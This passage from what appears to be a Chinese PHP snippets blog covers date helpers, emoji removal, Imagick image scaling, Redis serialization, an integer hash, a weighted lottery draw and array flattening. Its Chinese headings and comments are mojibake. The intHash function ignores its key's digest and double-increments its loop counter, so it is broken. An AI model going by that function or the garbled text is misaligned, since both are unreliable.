class="comment">//è·å–å½“æœˆç¬¬ä¸€å¤©å’Œæœ€åä¸€å¤©</span></span><br><span class="line">  private <span class="function"><span class="keyword">function</span> <span class="title">getthemonth</span>(<span class="params">$date</span>) </span></span><br><span class="line"><span class="function">	</span>&#123; </span><br><span class="line">		$firstday = date(<span class="string">'Y-m-01'</span>, strtotime($date)); </span><br><span class="line">		$lastday = date(<span class="string">'Y-m-d'</span>, strtotime(<span class="string">"$firstday +1 month -1 day"</span>)); </span><br><span class="line">		<span class="keyword">return</span> array($firstday, $lastday); </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å»é™¤emoji"><a href="#å»é™¤emoji" class="headerlink" title="å»é™¤emoji"></a>å»é™¤emoji</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeEmoji</span>(<span class="params">$text</span>) </span>&#123;</span><br><span class="line">    $clean_text = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// Match Emoticons</span></span><br><span class="line">    $regexEmoticons = <span class="string">'/[\x&#123;1F600&#125;-\x&#123;1F64F&#125;]/u'</span>;</span><br><span class="line">    $clean_text = preg_replace($regexEmoticons, <span class="string">''</span>, $text);</span><br><span class="line">    <span class="comment">// Match Miscellaneous Symbols and Pictographs</span></span><br><span class="line">    $regexSymbols = <span class="string">'/[\x&#123;1F300&#125;-\x&#123;1F5FF&#125;]/u'</span>;</span><br><span class="line">    $clean_text = preg_replace($regexSymbols, <span class="string">''</span>, $clean_text);</span><br><span class="line">    <span class="comment">// Match Transport And Map Symbols</span></span><br><span class="line">    $regexTransport = <span class="string">'/[\x&#123;1F680&#125;-\x&#123;1F6FF&#125;]/u'</span>;</span><br><span class="line">    $clean_text = preg_replace($regexTransport, <span class="string">''</span>, $clean_text);</span><br><span class="line">    <span class="keyword">return</span> $clean_text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="imagickç­‰æ¯”ç¼©æ”¾å›¾ç‰‡"><a href="#imagickç­‰æ¯”ç¼©æ”¾å›¾ç‰‡" class="headerlink" title="imagickç­‰æ¯”ç¼©æ”¾å›¾ç‰‡"></a>imagickç­‰æ¯”ç¼©æ”¾å›¾ç‰‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">     * ä½¿ç”¨imagick ç­‰æ¯”ç¼©æ”¾å›¾ç‰‡ </span></span><br><span class="line"><span class="comment">     * @param string $source_img  æºå›¾ç‰‡åœ°å€ </span></span><br><span class="line"><span class="comment">     * @param string $target_img  ç¼©æ”¾åå›¾ç‰‡åœ°å€ </span></span><br><span class="line"><span class="comment">     * @param int $with   ç¼©æ”¾åå›¾ç‰‡å®½åº¦ </span></span><br><span class="line"><span class="comment">     * @param int $height  ç¼©æ”¾åå›¾ç‰‡é«˜åº¦ </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">imagick</span>(<span class="params">$source_img,$target_img,$with,$height</span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(is_file($source_img))&#123; <span class="comment">//åˆ¤æ–­æºå›¾ç‰‡æ˜¯å¦å­˜åœ¨ </span></span><br><span class="line">            $im = <span class="keyword">new</span> Imagick(); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            exit; </span><br><span class="line">        &#125; </span><br><span class="line">        $result = $im-&gt;readImage($source_img);  </span><br><span class="line">        $srcWH = $im-&gt;getImageGeometry(); <span class="comment">//è·å–æºå›¾ç‰‡å®½å’Œé«˜ </span></span><br><span class="line">        <span class="comment">//å›¾ç‰‡ç­‰æ¯”ä¾‹ç¼©æ”¾å®½å’Œé«˜è®¾ç½® ï¼Œæ ¹æ®å®½åº¦è®¾ç½®ç­‰æ¯”ç¼©æ”¾ </span></span><br><span class="line">        <span class="keyword">if</span>($srcWH[<span class="string">'width'</span>]&gt;$<span class="keyword">with</span>)&#123; </span><br><span class="line">            $srcW[<span class="string">'width'</span>] = $<span class="keyword">with</span>; </span><br><span class="line">            $srcH[<span class="string">'height'</span>] = $srcW[<span class="string">'width'</span>]/$srcWH[<span class="string">'width'</span>]*$srcWH[<span class="string">'height'</span>]; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            $srcW[<span class="string">'width'</span>] = $srcWH[<span class="string">'width'</span>]; </span><br><span class="line">            $srcH[<span class="string">'height'</span>] = $srcWH[<span class="string">'height'</span>]; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        <span class="comment">//æŒ‰ç…§æ¯”ä¾‹è¿›è¡Œç¼©æ”¾ </span></span><br><span class="line">        $im-&gt;thumbnailImage( $srcW[<span class="string">'width'</span>], $srcH[<span class="string">'height'</span>], <span class="literal">true</span> );  </span><br><span class="line">         </span><br><span class="line">        <span class="comment">// æŒ‰ç…§ç¼©ç•¥å›¾å¤§å°åˆ›å»ºä¸€ä¸ªæœ‰é¢œè‰²çš„å›¾ç‰‡ </span></span><br><span class="line">        $new_img= <span class="keyword">new</span> Imagick(); </span><br><span class="line">        $new_img-&gt;newImage( $srcW[<span class="string">'width'</span>], $srcH[<span class="string">'height'</span>], <span class="string">'white'</span>, <span class="string">'jpg'</span> ); <span class="comment">//pink,black </span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">//åˆå¹¶å›¾ç‰‡ </span></span><br><span class="line">        $new_img-&gt;compositeImage( $im, <span class="attr">imagick</span>::COMPOSITE_OVER, <span class="number">0</span>, <span class="number">0</span>);  </span><br><span class="line">        <span class="comment">//ç”Ÿæˆå›¾ç‰‡ </span></span><br><span class="line">        $new_img-&gt;setImageFileName($target_img); </span><br><span class="line">        $new_img-&gt;writeImage(); </span><br><span class="line">        <span class="comment">//è¾“å‡ºå›¾ç‰‡ </span></span><br><span class="line">        header( <span class="string">"Content-Type: image/jpg"</span> ); </span><br><span class="line">        echo $new_img; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">https:<span class="comment">//gist.github.com/flowerains/beaab90b1bfc01054de3</span></span><br></pre></td></tr></table></figure>
<h3 id="redisæ”¯æŒphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#redisæ”¯æŒphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="redisæ”¯æŒphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>redisæ”¯æŒphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>, <span class="number">1</span>);</span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SERIALIZER, <span class="attr">Redis</span>::SERIALIZER_PHP);</span><br><span class="line">$key = <span class="string">'this_is_test'</span>;</span><br><span class="line">$value = [<span class="string">'15'</span>,<span class="string">'12'</span>,<span class="number">15</span>,<span class="string">'alex'</span>];</span><br><span class="line">$name = $redis-&gt;rPush($key,$value);</span><br><span class="line">$result = $redis-&gt;lpop($key);</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure>
<h3 id="ä¸€è‡´æ€§hash"><a href="#ä¸€è‡´æ€§hash" class="headerlink" title="ä¸€è‡´æ€§hash"></a>ä¸€è‡´æ€§hash</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ•´æ•°hash</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">intHash</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $md5 = substr(md5($key), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    $seed = <span class="number">31</span>;</span><br><span class="line">    $hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">8</span>; ++$i) &#123;</span><br><span class="line">        $hash = $hash * $seed + ord(md5($i));</span><br><span class="line">        ++$i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line">$value = intHash(<span class="string">'wangchuang'</span>) % <span class="number">2</span>;</span><br><span class="line">echo $value;</span><br></pre></td></tr></table></figure>
<h3 id="æŠ½å¥–çš„ç»å…¸ç®—æ³•"><a href="#æŠ½å¥–çš„ç»å…¸ç®—æ³•" class="headerlink" title="æŠ½å¥–çš„ç»å…¸ç®—æ³•"></a>æŠ½å¥–çš„ç»å…¸ç®—æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rand</span>(<span class="params">$proArr</span>) </span>&#123; </span><br><span class="line">    $result = <span class="string">''</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//æ¦‚ç‡æ•°ç»„çš„æ€»æ¦‚ç‡ç²¾åº¦ </span></span><br><span class="line">    $proSum = array_sum($proArr); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//æ¦‚ç‡æ•°ç»„å¾ªç¯ </span></span><br><span class="line">    foreach ($proArr <span class="keyword">as</span> $key =&gt; $proCur) &#123; </span><br><span class="line">        $randNum = mt_rand(<span class="number">1</span>, $proSum); </span><br><span class="line">        <span class="keyword">if</span> ($randNum &lt;= $proCur) &#123; </span><br><span class="line">            $result = $key; </span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            $proSum -= $proCur; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    unset ($proArr); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $result; </span><br><span class="line">&#125; </span><br><span class="line">$prize_arr = array( </span><br><span class="line">    <span class="string">'0'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">1</span>,<span class="string">'prize'</span>=&gt;<span class="string">'å¹³æ¿ç”µè„‘'</span>,<span class="string">'v'</span>=&gt;<span class="number">1</span>), </span><br><span class="line">    <span class="string">'1'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">2</span>,<span class="string">'prize'</span>=&gt;<span class="string">'æ•°ç ç›¸æœº'</span>,<span class="string">'v'</span>=&gt;<span class="number">5</span>), </span><br><span class="line">    <span class="string">'2'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">3</span>,<span class="string">'prize'</span>=&gt;<span class="string">'éŸ³ç®±è®¾å¤‡'</span>,<span class="string">'v'</span>=&gt;<span class="number">10</span>), </span><br><span class="line">    <span class="string">'3'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">4</span>,<span class="string">'prize'</span>=&gt;<span class="string">'4Gä¼˜ç›˜'</span>,<span class="string">'v'</span>=&gt;<span class="number">12</span>), </span><br><span class="line">    <span class="string">'4'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">5</span>,<span class="string">'prize'</span>=&gt;<span class="string">'10Qå¸'</span>,<span class="string">'v'</span>=&gt;<span class="number">22</span>), </span><br><span class="line">    <span class="string">'5'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">6</span>,<span class="string">'prize'</span>=&gt;<span class="string">'ä¸‹æ¬¡æ²¡å‡†å°±èƒ½ä¸­å“¦'</span>,<span class="string">'v'</span>=&gt;<span class="number">50</span>), </span><br><span class="line">); </span><br><span class="line">foreach ($prize_arr <span class="keyword">as</span> $key =&gt; $val) &#123; </span><br><span class="line">    $arr[$val[<span class="string">'id'</span>]] = $val[<span class="string">'v'</span>]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$rid = get_rand($arr); <span class="comment">//æ ¹æ®æ¦‚ç‡è·å–å¥–é¡¹id </span></span><br><span class="line"> </span><br><span class="line">$res[<span class="string">'yes'</span>] = $prize_arr[$rid<span class="number">-1</span>][<span class="string">'prize'</span>]; <span class="comment">//ä¸­å¥–é¡¹ </span></span><br><span class="line">unset($prize_arr[$rid<span class="number">-1</span>]); <span class="comment">//å°†ä¸­å¥–é¡¹ä»æ•°ç»„ä¸­å‰”é™¤ï¼Œå‰©ä¸‹æœªä¸­å¥–é¡¹ </span></span><br><span class="line">shuffle($prize_arr); <span class="comment">//æ‰“ä¹±æ•°ç»„é¡ºåº </span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($prize_arr);$i++)&#123; </span><br><span class="line">    $pr[] = $prize_arr[$i][<span class="string">'prize'</span>]; </span><br><span class="line">&#125; </span><br><span class="line">$res[<span class="string">'no'</span>] = $pr; </span><br><span class="line">echo json_encode($res); </span><br><span class="line">https:<span class="comment">//gist.github.com/flowerains/1e2e57906d496206a097</span></span><br><span class="line"></span><br><span class="line">$proArr = [<span class="string">'1'</span>=&gt;<span class="number">65</span>,<span class="string">'2'</span>=&gt;<span class="number">20</span>,<span class="string">'3'</span>=&gt;<span class="number">5</span>,<span class="string">'4'</span>=&gt;<span class="number">5</span>,<span class="string">'5'</span>=&gt;<span class="number">5</span>];</span><br><span class="line">$rank = get_rand($proArr);</span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//ç»Ÿè®¡æ¬¡æ•°</span></span><br><span class="line">$num1 = <span class="number">0</span>;</span><br><span class="line">$num2 = <span class="number">0</span>;</span><br><span class="line">$num3 = <span class="number">0</span>;</span><br><span class="line">$num4 = <span class="number">0</span>;</span><br><span class="line">$num5 = <span class="number">0</span>;</span><br><span class="line">$arr = array();</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    $rank = get_rand($proArr);</span><br><span class="line">    <span class="keyword">switch</span> ($rank) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $num1++;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $num2++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            $num3++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            $num4++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            $num5++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $arr[] = $rank;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;<span class="keyword">while</span>($i &lt; <span class="number">100000</span>);</span><br><span class="line">$value1 = number_format($num1/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value2 = number_format($num2/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value3 = number_format($num3/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value4 = number_format($num4/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value5 = number_format($num5/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">echo <span class="string">"1çš„ä¸­å¥–ç‡%$value1\n"</span>;</span><br><span class="line">echo <span class="string">"2çš„ä¸­å¥–ç‡%$value2\n"</span>;</span><br><span class="line">echo <span class="string">"3çš„ä¸­å¥–ç‡%$value3\n"</span>;</span><br><span class="line">echo <span class="string">"4çš„ä¸­å¥–ç‡%$value4\n"</span>;</span><br><span class="line">echo <span class="string">"5çš„ä¸­å¥–ç‡%$value5\n"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="æœ¬æœˆç¬¬ä¸€å¤©"><a href="#æœ¬æœˆç¬¬ä¸€å¤©" class="headerlink" title="æœ¬æœˆç¬¬ä¸€å¤©"></a>æœ¬æœˆç¬¬ä¸€å¤©</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸Šä¸€å‘¨çš„å‘¨ä¸€å‘¨æœ« </span></span><br><span class="line">$start=date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"2016-11-07"</span>.<span class="string">"-1 week Monday"</span>));</span><br><span class="line">echo date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"$start +6 day"</span>));</span><br><span class="line"><span class="comment">//ä¸‹ä¸€å‘¨çš„å‘¨ä¸€å‘¨æœ«</span></span><br><span class="line">$start=date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"2016-11-07"</span>.<span class="string">"+1 week Monday"</span>));  Â </span><br><span class="line">echo date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"$start +6 day"</span>)); Â </span><br><span class="line"><span class="comment">//æœ¬æœˆçš„ç¬¬ä¸€å¤©ï¼Œæœ€åä¸€å¤©   Â </span></span><br><span class="line">$start=date(<span class="string">'Y-m-01'</span>, strtotime(date(<span class="string">"Y-m-d"</span>)));  Â </span><br><span class="line">echo date(<span class="string">'Y-m-d'</span>, strtotime(<span class="string">"$start +1 month -1 day"</span>));</span><br></pre></td></tr></table></figure>
<h3 id="å¤šç»´æ•°ç»„è½¬ä¸€ç»´æ•°ç»„"><a href="#å¤šç»´æ•°ç»„è½¬ä¸€ç»´æ•°ç»„" class="headerlink" title="å¤šç»´æ•°ç»„è½¬ä¸€ç»´æ•°ç»„"></a>å¤šç»´æ•°ç»„è½¬ä¸€ç»´æ•°ç»„</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a=array(</span><br><span class="line">    <span class="number">0</span>=&gt;array(</span><br><span class="line">      <span class="number">0</span>=&gt;<span class="string">"a"</span>,</span><br><span class="line">        <span class="number">1</span>=&gt;array(</span><br><span class="line">          <span class="number">0</span>=&gt;<span class="string">'b'</span></span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    <span class="number">1</span>=&gt;array(</span><br><span class="line">      <span class="number">0</span>=&gt;<span class="string">'c'</span>,</span><br><span class="line">        <span class="number">1</span>=&gt;<span class="string">'d'</span>,</span><br><span class="line">        <span class="number">2</span>=&gt;array(</span><br><span class="line">          <span class="number">0</span>=&gt;array(</span><br><span class="line">           <span class="string">"ddd"</span>=&gt;array(</span><br><span class="line">              <span class="number">0</span>=&gt;<span class="string">'e'</span>,</span><br><span class="line">               <span class="string">"a"</span>=&gt;<span class="string">'f'</span>,</span><br><span class="line">               <span class="number">1</span>=&gt;<span class="string">'g'</span></span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'w'</span>=&gt;<span class="string">'h'</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//è·å–æœªçŸ¥ç»´åº¦æ•°ç»„æœ€é‡Œé¢çš„å€¼ï¼Œæ¢æˆä¸€ç»´æ•°ç»„https://3v4l.org/Mrjr1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_array_value</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">  $result=array();</span><br><span class="line">  array_walk_recursive($data,<span class="function"><span class="keyword">function</span>(<span class="params">$value</span>) <span class="title">use</span> (<span class="params">&amp;$result</span>)</span>&#123;</span><br><span class="line">    array_push($result,$value);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line">print_r(get_array_value($a));</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; a</span><br><span class="line">    [<span class="number">1</span>] =&gt; b</span><br><span class="line">    [<span class="number">2</span>] =&gt; c</span><br><span class="line">    [<span class="number">3</span>] =&gt; d</span><br><span class="line">    [<span class="number">4</span>] =&gt; e</span><br><span class="line">    [<span class="number">5</span>] =&gt; f</span><br><span class="line">    [<span class="number">6</span>] =&gt; g</span><br><span class="line">    [<span class="number">7</span>] =&gt; h</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§"><a href="#é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§" class="headerlink" title="é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§"></a>é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">å°è£…ï¼Œç»§æ‰¿ï¼Œå¤šæ€ é¢å‘å¯¹è±¡çš„äº”å¤§åŸåˆ™</span><br><span class="line">         </span><br><span class="line">         å•ä¸€èŒè´£åŸåˆ™ï¼Œå¼€æ”¾å°é—­åŸåˆ™ï¼Œé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œä¾èµ–å€’ç½®åŸåˆ™ï¼Œæ¥å£éš”ç¦»åŸåˆ™</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * è£…é¥°å™¨åŠ¨æ€æ·»åŠ åŠŸèƒ½</span></span><br><span 